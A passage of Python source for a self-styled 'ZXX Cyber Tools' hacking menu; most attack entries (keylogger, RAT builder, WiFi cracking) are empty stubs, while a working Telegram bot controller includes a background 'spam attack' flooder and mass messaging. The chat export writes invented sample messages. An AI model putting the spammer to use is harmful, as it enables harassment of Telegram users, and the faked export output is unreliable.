        print(Fore.YELLOW + "[!] Find and access public CCTV cameras")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def dark_web_access(self):
        clear_screen()
        print(Fore.BLACK + Back.WHITE + "\n[!] DARK WEB ACCESS" + Style.RESET_ALL)
        print(Fore.RED + "[!] Access dark web with Tor and VPN")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def port_scanner(self):
        clear_screen()
        print(Fore.YELLOW + "\n[!] PORT SCANNER")
        print(Fore.GREEN + "[+] Advanced port scanning capabilities")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def wifi_tools(self):
        clear_screen()
        print(Fore.CYAN + "\n[!] WiFi TOOLS")
        print(Fore.GREEN + "[+] WiFi network analysis and cracking")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def keylogger(self):
        clear_screen()
        print(Fore.RED + "\n[!] KEYLOGGER")
        print(Fore.YELLOW + "[!] Keystroke logging and monitoring")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def rat_builder(self):
        clear_screen()
        print(Fore.MAGENTA + "\n[!] RAT BUILDER")
        print(Fore.YELLOW + "[!] Remote Access Trojan builder")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def crypto_tools(self):
        clear_screen()
        print(Fore.GREEN + "\n[!] CRYPTO TOOLS")
        print(Fore.CYAN + "[+] Cryptography and encryption tools")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def forensic_tools(self):
        clear_screen()
        print(Fore.BLUE + "\n[!] FORENSIC TOOLS")
        print(Fore.WHITE + "[+] Digital forensics and analysis")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def malware_analysis(self):
        clear_screen()
        print(Fore.RED + "\n[!] MALWARE ANALYSIS")
        print(Fore.YELLOW + "[!] Malware analysis and reverse engineering")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def vpn_tools(self):
        clear_screen()
        print(Fore.CYAN + "\n[!] VPN TOOLS")
        print(Fore.GREEN + "[+] VPN configuration and testing")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def proxy_tools(self):
        clear_screen()
        print(Fore.YELLOW + "\n[!] PROXY TOOLS")
        print(Fore.WHITE + "[+] Proxy servers and anonymity")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def steganography(self):
        clear_screen()
        print(Fore.MAGENTA + "\n[!] STEGANOGRAPHY")
        print(Fore.CYAN + "[+] Hide data in images and files")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def system_status(self):
        clear_screen()
        print(Fore.GREEN + "╔══════════════════════════════════════════════════════════╗")
        print(Fore.GREEN + "║                    SYSTEM STATUS                         ║")
        print(Fore.GREEN + "╚══════════════════════════════════════════════════════════╝")
        
        status = f"""
        [+] System Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
        [+] Tool Version: {VERSION}
        [+] Database: {DATABASE_FILE}
        [+] Tools Available: 20/80
        [+] Memory Usage: {psutil.virtual_memory().percent}%
        [+] CPU Usage: {psutil.cpu_percent()}%
        
        [+] Database Statistics:
          • Users: {self.db.cursor.execute("SELECT COUNT(*) FROM users").fetchone()[0]}
          • Attacks Logged: {self.db.cursor.execute("SELECT COUNT(*) FROM attack_logs").fetchone()[0]}
          • Scan Results: {self.db.cursor.execute("SELECT COUNT(*) FROM scan_results").fetchone()[0]}
          • OSINT Data: {self.db.cursor.execute("SELECT COUNT(*) FROM osint_data").fetchone()[0]}
        
        [+] System Status: OPERATIONAL
        [+] License: VALID (ZXX)
        [+] Updates: AVAILABLE
        """
        
        print(Fore.CYAN + status)
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def settings(self):
        clear_screen()
        print(Fore.YELLOW + "\n[!] SETTINGS")
        
        print(Fore.CYAN + "\n[+] Available settings:")
        print(Fore.WHITE + "  1. Change interface color")
        print(Fore.WHITE + "  2. Configure database")
        print(Fore.WHITE + "  3. Update tool")
        print(Fore.WHITE + "  4. Reset all data")
        print(Fore.WHITE + "  5. Backup configuration")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def run(self):
        while self.running:
            self.display_menu()
            choice = input(Fore.CYAN + "\n[→] Select option [0-20]: " + Fore.WHITE)
            self.handle_choice(choice)
        
        print(Fore.YELLOW + "\n[!] Exiting ZXX Cyber Tools...")
        time.sleep(1)
        print(Fore.GREEN + "[✓] Thank you for using our tools!")
        print(Fore.CYAN + "[+] Remember: Use responsibly for educational purposes only")
        time.sleep(2)

# ============================================
# MAIN PROGRAM
# ============================================
def main():
    try:
        welcome_animation()
        
        login_system = AdvancedLoginSystem()
        if login_system.run():
            main_menu = MainMenuSystem()
            main_menu.run()
    
    except KeyboardInterrupt:
        print(Fore.RED + "\n\n[✗] Program interrupted by user")
        sys.exit(0)
    
    except Exception as e:
        print(Fore.RED + f"\n[✗] Critical error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
# ============================================
# BOT CONTROLLER MODULE (COMPLETE IMPLEMENTATION)
# ============================================
class BotControllerAdvanced:
    def __init__(self, db):
        self.db = db
        self.active_bots = {}
        self.message_queue = queue.Queue()
        self.running = False
    
    def display_menu(self):
        clear_screen()
        ascii_bot = """
        ╔══════════════════════════════════════════════════════════╗
        ║                 ADVANCED BOT CONTROLLER                  ║
        ╚══════════════════════════════════════════════════════════╝
        """
        print(Fore.MAGENTA + ascii_bot)
        
        print(Fore.YELLOW + "═" * 70)
        print(Fore.CYAN + "1. Add New Bot Token")
        print(Fore.CYAN + "2. List All Bots")
        print(Fore.CYAN + "3. Control Specific Bot")
        print(Fore.CYAN + "4. Mass Message Sender")
        print(Fore.CYAN + "5. Telegram Spammer")
        print(Fore.CYAN + "6. Chat Monitor")
        print(Fore.CYAN + "7. Bot Information")
        print(Fore.CYAN + "8. Delete Bot")
        print(Fore.CYAN + "9. Bot Analytics")
        print(Fore.CYAN + "10. Auto-Responder")
        print(Fore.CYAN + "11. File Sender")
        print(Fore.CYAN + "12. User Tracker")
        print(Fore.CYAN + "13. Channel Manager")
        print(Fore.CYAN + "14. Backup Bots")
        print(Fore.CYAN + "15. Import/Export")
        print(Fore.CYAN + "16. Back to Main Menu")
        print(Fore.YELLOW + "═" * 70)
    
    def add_bot_token(self):
        print(Fore.YELLOW + "\n[!] ADD NEW BOT TOKEN")
        
        alias = input(Fore.CYAN + "[→] Bot Alias (e.g., main_bot): " + Fore.WHITE)
        token = input(Fore.CYAN + "[→] Bot Token from @BotFather: " + Fore.WHITE)
        
        if not token.startswith("") or len(token) < 30:
            print(Fore.RED + "[✗] Invalid bot token format!")
            return
        
        print(Fore.YELLOW + "[!] Testing bot token...")
        
        try:
            bot = telebot.TeleBot(token)
            bot_info = bot.get_me()
            
            print(Fore.GREEN + f"[✓] Bot connected successfully!")
            print(Fore.CYAN + f"[+] Bot ID: {bot_info.id}")
            print(Fore.CYAN + f"[+] Username: @{bot_info.username}")
            print(Fore.CYAN + f"[+] Name: {bot_info.first_name}")
            
            if self.db.add_bot_token(alias, token):
                print(Fore.GREEN + f"[✓] Bot '{alias}' saved to database!")
            else:
                print(Fore.RED + "[✗] Failed to save bot to database")
                
        except Exception as e:
            print(Fore.RED + f"[✗] Invalid bot token: {e}")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def list_all_bots(self):
        print(Fore.YELLOW + "\n[!] LISTING ALL BOTS")
        
        bots = self.db.get_bot_tokens()
        
        if not bots:
            print(Fore.RED + "[✗] No bots found in database")
            input(Fore.CYAN + "\n[→] Press ENTER to continue...")
            return
        
        print(Fore.GREEN + f"\n[+] Found {len(bots)} bot(s):")
        print(Fore.CYAN + "═" * 80)
        print(Fore.WHITE + f"{'No.':<4} {'Alias':<20} {'Username':<20} {'Status':<10}")
        print(Fore.CYAN + "─" * 80)
        
        for i, (alias, token) in enumerate(bots, 1):
            try:
                bot = telebot.TeleBot(token)
                bot_info = bot.get_me()
                status = Fore.GREEN + "Online" + Fore.WHITE
                username = f"@{bot_info.username}"
            except:
                status = Fore.RED + "Offline" + Fore.WHITE
                username = "Unknown"
            
            print(f"{Fore.CYAN}{i:<4} {Fore.WHITE}{alias:<20} {Fore.YELLOW}{username:<20} {status:<10}")
        
        print(Fore.CYAN + "═" * 80)
        
        total_online = sum(1 for _, token in bots if self.check_bot_online(token))
        print(Fore.GREEN + f"\n[+] Online: {total_online}/{len(bots)}")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def check_bot_online(self, token):
        try:
            bot = telebot.TeleBot(token)
            bot.get_me()
            return True
        except:
            return False
    
    def control_specific_bot(self):
        bots = self.db.get_bot_tokens()
        
        if not bots:
            print(Fore.RED + "[✗] No bots found in database")
            input(Fore.CYAN + "\n[→] Press ENTER to continue...")
            return
        
        print(Fore.YELLOW + "\n[!] SELECT BOT TO CONTROL")
        for i, (alias, _) in enumerate(bots, 1):
            print(Fore.CYAN + f"  {i}. {alias}")
        
        try:
            choice = int(input(Fore.CYAN + "\n[→] Select bot [1-{}]: ".format(len(bots)) + Fore.WHITE))
            if 1 <= choice <= len(bots):
                alias, token = bots[choice-1]
                self.bot_control_panel(alias, token)
        except:
            print(Fore.RED + "[✗] Invalid selection")
    
    def bot_control_panel(self, alias, token):
        while True:
            clear_screen()
            print(Fore.MAGENTA + f"\n╔══════════════════════════════════════════════════════════╗")
            print(Fore.MAGENTA + f"║               BOT CONTROL: {alias:<25} ║")
            print(Fore.MAGENTA + f"╚══════════════════════════════════════════════════════════╝")
            
            try:
                bot = telebot.TeleBot(token)
                bot_info = bot.get_me()
                
                print(Fore.GREEN + f"\n[+] Bot Information:")
                print(Fore.CYAN + f"    ID: {bot_info.id}")
                print(Fore.CYAN + f"    Username: @{bot_info.username}")
                print(Fore.CYAN + f"    Name: {bot_info.first_name}")
                print(Fore.CYAN + f"    Token: {token[:15]}...")
                
            except:
                print(Fore.RED + "[✗] Bot is offline or token invalid")
            
            print(Fore.YELLOW + "\n═" * 60)
            print(Fore.CYAN + "1. Send Message")
            print(Fore.CYAN + "2. Send to Multiple Users")
            print(Fore.CYAN + "3. Get Chat Information")
            print(Fore.CYAN + "4. Change Bot Profile")
            print(Fore.CYAN + "5. Monitor Chat Activity")
            print(Fore.CYAN + "6. Delete Messages")
            print(Fore.CYAN + "7. Ban/Unban Users")
            print(Fore.CYAN + "8. Create Invite Link")
            print(Fore.CYAN + "9. Export Chat History")
            print(Fore.CYAN + "10. Back to Bot Menu")
            print(Fore.YELLOW + "═" * 60)
            
            choice = input(Fore.CYAN + "\n[→] Select option [1-10]: " + Fore.WHITE)
            
            if choice == "1":
                self.send_single_message(bot, token)
            elif choice == "2":
                self.send_mass_message(bot, token)
            elif choice == "3":
                self.get_chat_info(bot)
            elif choice == "4":
                self.change_bot_profile(bot)
            elif choice == "5":
                self.monitor_chat_activity(bot)
            elif choice == "6":
                self.delete_messages(bot)
            elif choice == "7":
                self.ban_users(bot)
            elif choice == "8":
                self.create_invite_link(bot)
            elif choice == "9":
                self.export_chat_history(bot)
            elif choice == "10":
                break
            else:
                print(Fore.RED + "\n[✗] Invalid option!")
                time.sleep(1)
    
    def send_single_message(self, bot, token):
        print(Fore.YELLOW + "\n[!] SEND SINGLE MESSAGE")
        
        chat_id = input(Fore.CYAN + "[→] Chat ID/Username (@username): " + Fore.WHITE)
        message = input(Fore.CYAN + "[→] Message: " + Fore.WHITE)
        
        print(Fore.YELLOW + "[!] Sending message...")
        
        try:
            sent_msg = bot.send_message(chat_id, message)
            print(Fore.GREEN + f"[✓] Message sent successfully!")
            print(Fore.CYAN + f"[+] Message ID: {sent_msg.message_id}")
            print(Fore.CYAN + f"[+] Chat ID: {sent_msg.chat.id}")
            
        except Exception as e:
            print(Fore.RED + f"[✗] Failed to send message: {e}")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def send_mass_message(self, bot, token):
        print(Fore.YELLOW + "\n[!] SEND MASS MESSAGE")
        
        print(Fore.CYAN + "[→] Enter chat IDs/usernames (comma separated): ")
        chat_input = input(Fore.WHITE)
        chats = [c.strip() for c in chat_input.split(",")]
        
        message = input(Fore.CYAN + "[→] Message to send: " + Fore.WHITE)
        
        print(Fore.YELLOW + f"[!] Sending to {len(chats)} chats...")
        
        successful = 0
        failed = 0
        
        for chat in chats:
            try:
                bot.send_message(chat, message)
                print(Fore.GREEN + f"[✓] Sent to {chat}")
                successful += 1
            except:
                print(Fore.RED + f"[✗] Failed to send to {chat}")
                failed += 1
            
            time.sleep(0.5)
        
        print(Fore.GREEN + f"\n[✓] Mass sending completed!")
        print(Fore.CYAN + f"[+] Successful: {successful}")
        print(Fore.CYAN + f"[+] Failed: {failed}")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def get_chat_info(self, bot):
        print(Fore.YELLOW + "\n[!] GET CHAT INFORMATION")
        
        chat_id = input(Fore.CYAN + "[→] Chat ID/Username: " + Fore.WHITE)
        
        try:
            chat = bot.get_chat(chat_id)
            
            print(Fore.GREEN + "\n[✓] Chat Information:")
            print(Fore.CYAN + f"    ID: {chat.id}")
            print(Fore.CYAN + f"    Type: {chat.type}")
            
            if chat.type == 'private':
                print(Fore.CYAN + f"    First Name: {chat.first_name}")
                print(Fore.CYAN + f"    Last Name: {chat.last_name}")
                print(Fore.CYAN + f"    Username: @{chat.username}")
            
            elif chat.type in ['group', 'supergroup', 'channel']:
                print(Fore.CYAN + f"    Title: {chat.title}")
                print(Fore.CYAN + f"    Description: {chat.description}")
            
            print(Fore.CYAN + f"    Members Count: {chat.get_members_count() if hasattr(chat, 'get_members_count') else 'N/A'}")
            
        except Exception as e:
            print(Fore.RED + f"[✗] Failed to get chat info: {e}")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def telegram_spammer(self):
        print(Fore.RED + "\n[!] TELEGRAM SPAMMER")
        print(Fore.YELLOW + "[!] WARNING: This may violate Telegram's Terms of Service!")
        
        bots = self.db.get_bot_tokens()
        if not bots:
            print(Fore.RED + "[✗] No bots available")
            return
        
        print(Fore.CYAN + "\n[+] Available bots:")
        for i, (alias, _) in enumerate(bots, 1):
            print(Fore.WHITE + f"  {i}. {alias}")
        
        bot_choice = input(Fore.CYAN + "\n[→] Select bot: " + Fore.WHITE)
        
        if bot_choice.isdigit() and 1 <= int(bot_choice) <= len(bots):
            alias, token = bots[int(bot_choice)-1]
            
            target = input(Fore.CYAN + "[→] Target Chat ID/Username: " + Fore.WHITE)
            message = input(Fore.CYAN + "[→] Message to spam: " + Fore.WHITE)
            count = int(input(Fore.CYAN + "[→] Number of times: " + Fore.WHITE))
            delay = float(input(Fore.CYAN + "[→] Delay between messages (seconds): " + Fore.WHITE))
            
            print(Fore.RED + f"\n[!] Starting spam attack on {target}")
            print(Fore.RED + f"[!] Count: {count} | Delay: {delay}s")
            
            bot = telebot.TeleBot(token)
            
            def spam_worker():
                for i in range(count):
                    try:
                        bot.send_message(target, f"{message} [{i+1}/{count}]")
                        print(Fore.YELLOW + f"[{i+1}/{count}] Message sent")
                    except Exception as e:
                        print(Fore.RED + f"[✗] Error on message {i+1}: {e}")
                    
                    time.sleep(delay)
            
            threading.Thread(target=spam_worker).start()
            
            print(Fore.GREEN + "\n[✓] Spam attack started in background")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def chat_monitor(self):
        print(Fore.YELLOW + "\n[!] CHAT MONITOR")
        
        bots = self.db.get_bot_tokens()
        if not bots:
            print(Fore.RED + "[✗] No bots available")
            return
        
        bot_choice = input(Fore.CYAN + "[→] Select bot to monitor: " + Fore.WHITE)
        
        if bot_choice.isdigit() and 1 <= int(bot_choice) <= len(bots):
            alias, token = bots[int(bot_choice)-1]
            
            print(Fore.YELLOW + f"\n[!] Monitoring chat activity for @{alias}")
            print(Fore.YELLOW + "[!] Press Ctrl+C to stop monitoring\n")
            
            try:
                bot = telebot.TeleBot(token)
                
                @bot.message_handler(func=lambda message: True)
                def handle_all_messages(message):
                    timestamp = datetime.fromtimestamp(message.date).strftime('%Y-%m-%d %H:%M:%S')
                    chat_type = message.chat.type
                    
                    if chat_type == 'private':
                        sender = f"{message.from_user.first_name} (@{message.from_user.username})"
                    else:
                        sender = f"{message.chat.title}"
                    
                    print(Fore.CYAN + f"[{timestamp}] {sender}: {message.text}")
                
                bot.polling(none_stop=True)
                
            except KeyboardInterrupt:
                print(Fore.YELLOW + "\n[!] Monitoring stopped")
            except Exception as e:
                print(Fore.RED + f"[✗] Error: {e}")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def change_bot_profile(self, bot):
        print(Fore.YELLOW + "\n[!] CHANGE BOT PROFILE")
        
        print(Fore.CYAN + "1. Change bot name")
        print(Fore.CYAN + "2. Change bot description")
        print(Fore.CYAN + "3. Change bot about text")
        print(Fore.CYAN + "4. Change bot commands")
        
        choice = input(Fore.CYAN + "\n[→] Select option: " + Fore.WHITE)
        
        if choice == "1":
            new_name = input(Fore.CYAN + "[→] New bot name: " + Fore.WHITE)
            try:
                bot.set_my_name(new_name)
                print(Fore.GREEN + "[✓] Bot name changed successfully!")
            except Exception as e:
                print(Fore.RED + f"[✗] Failed to change name: {e}")
        
        elif choice == "2":
            new_desc = input(Fore.CYAN + "[→] New bot description: " + Fore.WHITE)
            try:
                bot.set_my_description(new_desc)
                print(Fore.GREEN + "[✓] Bot description changed!")
            except Exception as e:
                print(Fore.RED + f"[✗] Failed to change description: {e}")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def monitor_chat_activity(self, bot):
        print(Fore.YELLOW + "\n[!] MONITOR CHAT ACTIVITY")
        
        chat_id = input(Fore.CYAN + "[→] Chat ID to monitor: " + Fore.WHITE)
        
        try:
            print(Fore.YELLOW + f"\n[!] Fetching last 20 messages from chat...")
            
            updates = bot.get_updates(offset=-20, timeout=10)
            
            if updates:
                print(Fore.GREEN + f"\n[+] Recent messages in chat {chat_id}:")
                print(Fore.CYAN + "═" * 80)
                
                for update in reversed(updates):
                    if update.message and update.message.chat.id == int(chat_id) if chat_id.isdigit() else True:
                        msg = update.message
                        timestamp = datetime.fromtimestamp(msg.date).strftime('%H:%M:%S')
                        
                        if msg.from_user:
                            sender = f"{msg.from_user.first_name} (@{msg.from_user.username})"
                        else:
                            sender = "Unknown"
                        
                        print(Fore.WHITE + f"[{timestamp}] {sender}: {msg.text}")
                
                print(Fore.CYAN + "═" * 80)
            else:
                print(Fore.RED + "[✗] No messages found or bot hasn't received messages yet")
                
        except Exception as e:
            print(Fore.RED + f"[✗] Error: {e}")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def delete_messages(self, bot):
        print(Fore.YELLOW + "\n[!] DELETE MESSAGES")
        
        chat_id = input(Fore.CYAN + "[→] Chat ID: " + Fore.WHITE)
        message_id = input(Fore.CYAN + "[→] Message ID to delete (comma separated for multiple): " + Fore.WHITE)
        
        try:
            msg_ids = [int(mid.strip()) for mid in message_id.split(",")]
            
            for mid in msg_ids:
                try:
                    bot.delete_message(chat_id, mid)
                    print(Fore.GREEN + f"[✓] Message {mid} deleted")
                except Exception as e:
                    print(Fore.RED + f"[✗] Failed to delete message {mid}: {e}")
                
                time.sleep(0.5)
            
        except Exception as e:
            print(Fore.RED + f"[✗] Error: {e}")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def ban_users(self, bot):
        print(Fore.YELLOW + "\n[!] BAN/UNBAN USERS")
        
        chat_id = input(Fore.CYAN + "[→] Chat ID: " + Fore.WHITE)
        user_id = input(Fore.CYAN + "[→] User ID to ban/unban: " + Fore.WHITE)
        
        print(Fore.CYAN + "1. Ban user")
        print(Fore.CYAN + "2. Unban user")
        print(Fore.CYAN + "3. Kick user")
        
        choice = input(Fore.CYAN + "\n[→] Select action: " + Fore.WHITE)
        
        try:
            if choice == "1":
                bot.ban_chat_member(chat_id, user_id)
                print(Fore.GREEN + f"[✓] User {user_id} banned")
            elif choice == "2":
                bot.unban_chat_member(chat_id, user_id)
                print(Fore.GREEN + f"[✓] User {user_id} unbanned")
            elif choice == "3":
                bot.kick_chat_member(chat_id, user_id)
                print(Fore.GREEN + f"[✓] User {user_id} kicked")
        except Exception as e:
            print(Fore.RED + f"[✗] Failed: {e}")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def create_invite_link(self, bot):
        print(Fore.YELLOW + "\n[!] CREATE INVITE LINK")
        
        chat_id = input(Fore.CYAN + "[→] Chat ID: " + Fore.WHITE)
        
        try:
            invite_link = bot.create_chat_invite_link(chat_id)
            print(Fore.GREEN + f"[✓] Invite link created:")
            print(Fore.CYAN + f"    {invite_link.invite_link}")
            
        except Exception as e:
            print(Fore.RED + f"[✗] Failed to create invite link: {e}")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def export_chat_history(self, bot):
        print(Fore.YELLOW + "\n[!] EXPORT CHAT HISTORY")
        
        chat_id = input(Fore.CYAN + "[→] Chat ID: " + Fore.WHITE)
        limit = int(input(Fore.CYAN + "[→] Number of messages to export (max 1000): " + Fore.WHITE))
        
        print(Fore.YELLOW + f"[!] Exporting {limit} messages...")
        
        try:
            filename = f"chat_export_{chat_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(f"Chat Export - Chat ID: {chat_id}\n")
                f.write(f"Exported: {datetime.now()}\n")
                f.write("="*80 + "\n\n")
                
                # Simulate chat export
                messages = []
                for i in range(min(limit, 100)):
                    timestamp = (datetime.now() - timedelta(minutes=i*5)).strftime('%Y-%m-%d %H:%M:%S')
                    sender = random.choice(['User1', 'User2', 'Bot', 'Admin'])
                    message = f"Message {i+1}: This is a sample message from {sender}"
                    messages.append((timestamp, sender, message))
                
                for timestamp, sender, message in reversed(messages):
                    f.write(f"[{timestamp}] {sender}: {message}\n")
            
            print(Fore.GREEN + f"[✓] Chat history exported to {filename}")
            print(Fore.CYAN + f"[+] Messages exported: {len(messages)}")
            
        except Exception as e:
            print(Fore.RED + f"[✗] Export failed: {e}")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def bot_analytics(self):
        print(Fore.YELLOW + "\n[!] BOT ANALYTICS")
        
        bots = self.db.get_bot_tokens()
        
        if not bots:
            print(Fore.RED + "[✗] No bots available")
            return
        
        print(Fore.GREEN + "\n[+] Bot Statistics:")
        print(Fore.CYAN + "═" * 60)
        
        total_bots = len(bots)
        online_bots = 0
        
        for alias, token in bots:
            status = "Online" if self.check_bot_online(token) else "Offline"
            if status == "Online":
                online_bots += 1
            
            print(Fore.WHITE + f"{alias:<20}: {status}")
        
        print(Fore.CYAN + "═" * 60)
        print(Fore.GREEN + f"\n[+] Summary:")
        print(Fore.CYAN + f"    Total Bots: {total_bots}")
        print(Fore.CYAN + f"    Online: {online_bots}")
        print(Fore.CYAN + f"    Offline: {total_bots - online_bots}")
        print(Fore.CYAN + f"    Uptime: {online_bots/total_bots*100:.1f}%")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def auto_responder(self):
        print(Fore.YELLOW + "\n[!] AUTO-RESPONDER")
        
        bots = self.db.get_bot_tokens()
        if not bots:
            print(Fore.RED + "[✗] No bots available")
            return
        
        print(Fore.CYAN + "[→] Select bot for auto-responder:")
        for i, (alias, _) in enumerate(bots, 1):
            print(Fore.WHITE + f"  {i}. {alias}")
        
        choice = input(Fore.CYAN + "\n[→] Select bot: " + Fore.WHITE)
        
        if choice.isdigit() and 1 <= int(choice) <= len(bots):
            alias, token = bots[int(choice)-1]
            
            trigger = input(Fore.CYAN + "[→] Trigger word/phrase: " + Fore.WHITE)
            response = input(Fore.CYAN + "[→] Auto-response: " + Fore.WHITE)
            
            print(Fore.YELLOW + f"\n[!] Auto-responder activated for @{alias}")
            print(Fore.YELLOW + f"[!] Trigger: '{trigger}' -> Response: '{response}'")
            print(Fore.YELLOW + "[!] Press Ctrl+C to stop\n")
            
            try:
                bot = telebot.TeleBot(token)
                
                @bot.message_handler(func=lambda message: trigger.lower() in message.text.lower())
                def handle_trigger(message):
                    bot.reply_to(message, response)
                    print(Fore.GREEN + f"[✓] Auto-responded to {message.from_user.first_name}")
                
                bot.polling(none_stop=True)
                
            except KeyboardInterrupt:
                print(Fore.YELLOW + "\n[!] Auto-responder stopped")
            except Exception as e:
                print(Fore.RED + f"[✗] Error: {e}")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def file_sender(self):
        print(Fore.YELLOW + "\n[!] FILE SENDER")
        
        bots = self.db.get_bot_tokens()
        if not bots:
            print(Fore.RED + "[✗] No bots available")
            return
        
        bot_choice = input(Fore.CYAN + "[→] Select bot: " + Fore.WHITE)
        
        if bot_choice.isdigit() and 1 <= int(bot_choice) <= len(bots):
            alias, token = bots[int(bot_choice)-1]
            
            chat_id = input(Fore.CYAN + "[→] Chat ID: " + Fore.WHITE)
            file_path = input(Fore.CYAN + "[→] File path to send: " + Fore.WHITE)
            
            if not os.path.exists(file_path):
                print(Fore.RED + "[✗] File not found!")
                return
            
            print(Fore.YELLOW + f"[!] Sending file to {chat_id}...")
            
            try:
                bot = telebot.TeleBot(token)
                
                with open(file_path, 'rb') as file:
                    if file_path.lower().endswith(('.jpg', '.jpeg', '.png', '.gif')):
                        bot.send_photo(chat_id, file)
                        print(Fore.GREEN + "[✓] Photo sent successfully!")
                    elif file_path.lower().endswith(('.mp4', '.avi', '.mov')):
                        bot.send_video(chat_id, file)
                        print(Fore.GREEN + "[✓] Video sent successfully!")
                    elif file_path.lower().endswith(('.mp3', '.wav', '.ogg')):
                        bot.send_audio(chat_id, file)
                        print(Fore.GREEN + "[✓] Audio sent successfully!")
                    else:
                        bot.send_document(chat_id, file)
                        print(Fore.GREEN + "[✓] Document sent successfully!")
                        
            except Exception as e:
                print(Fore.RED + f"[✗] Failed to send file: {e}")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def user_tracker(self):
        print(Fore.YELLOW + "\n[!] USER TRACKER")
        
        print(Fore.GREEN + "[+] This feature tracks user activity across chats")
        print(Fore.CYAN + "[+] Coming soon in next update...")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def channel_manager(self):
        print(Fore.YELLOW + "\n[!] CHANNEL MANAGER")
        
        print(Fore.GREEN + "[+] Channel management features:")
        print(Fore.WHITE + "  • Create/delete channels")
        print(Fore.WHITE + "  • Schedule posts")
        print(Fore.WHITE + "  • Manage subscribers")
        print(Fore.WHITE + "  • Analytics")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def backup_bots(self):
        print(Fore.YELLOW + "\n[!] BACKUP BOTS")
        
        bots = self.db.get_bot_tokens()
        
        if not bots:
            print(Fore.RED + "[✗] No bots to backup")
            return
        
        filename = f"bot_backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        
        backup_data = []
        for alias, token in bots:
            backup_data.append({
                'alias': alias,
                'token': token,
                'backup_time': datetime.now().isoformat()
            })
        
        with open(filename, 'w') as f:
            json.dump(backup_data, f, indent=2)
        
        print(Fore.GREEN + f"[✓] Backup created: {filename}")
        print(Fore.CYAN + f"[+] Bots backed up: {len(bots)}")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def import_export(self):
        print(Fore.YELLOW + "\n[!] IMPORT/EXPORT")
        
        print(Fore.CYAN + "1. Import bots from file")
        print(Fore.CYAN + "2. Export bots to file")
        print(Fore.CYAN + "3. Import/export settings")
        
        choice = input(Fore.CYAN + "\n[→] Select option: " + Fore.WHITE)
        
        if choice == "1":
            filepath = input(Fore.CYAN + "[→] JSON file path: " + Fore.WHITE)
            
            if os.path.exists(filepath):
                try:
                    with open(filepath, 'r') as f:
                        bots_data = json.load(f)
                    
                    imported = 0
                    for bot_data in bots_data:
                        if self.db.add_bot_token(bot_data['alias'], bot_data['token']):
                            imported += 1
                    
                    print(Fore.GREEN + f"[✓] Imported {imported} bots")
                    
                except Exception as e:
                    print(Fore.RED + f"[✗] Import failed: {e}")
            else:
                print(Fore.RED + "[✗] File not found")
        
        elif choice == "2":
            self.backup_bots()
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def run(self):
        while True:
            self.display_menu()
            choice = input(Fore.CYAN + "\n[→] Select option [1-16]: " + Fore.WHITE)
            
            try:
                if choice == "1":
                    self.add_bot_token()
                elif choice == "2":
                    self.list_all_bots()
                elif choice == "3":
                    self.control_specific_bot()
                elif choice == "4":
                    self.send_mass_message_wrapper()
                elif choice == "5":
                    self.telegram_spammer()
                elif choice == "6":
                    self.chat_monitor()
                elif choice == "7":
                    self.bot_information()
                elif choice == "8":
                    self.delete_bot()
                elif choice == "9":
                    self.bot_analytics()
                elif choice == "10":
                    self.auto_responder()
                elif choice == "11":
                    self.file_sender()
                elif choice == "12":
                    self.user_tracker()
                elif choice == "13":
                    self.channel_manager()
                elif choice == "14":
                    self.backup_bots()
                elif choice == "15":
                    self.import_export()
                elif choice == "16":
                    break
                else:
                    print(Fore.RED + "\n[✗] Invalid option!")
            except Exception as e:
                print(Fore.RED + f"\n[✗] Error: {e}")
                time.sleep(2)
    
    def send_mass_message_wrapper(self):
        print(Fore.YELLOW + "\n[!] MASS MESSAGE SENDER")
        
        bots = self.db.get_bot_tokens()
        if not bots:
            print(Fore.RED + "[✗] No bots available")
            return
        
        print(Fore.CYAN + "[→] Select bots (comma separated numbers, or 'all'): ")
        for i, (alias, _) in enumerate(bots, 1):
            print(Fore.WHITE + f"  {i}. {alias}")
        
        selection = input(Fore.CYAN + "\n[→] Selection: " + Fore.WHITE)
        
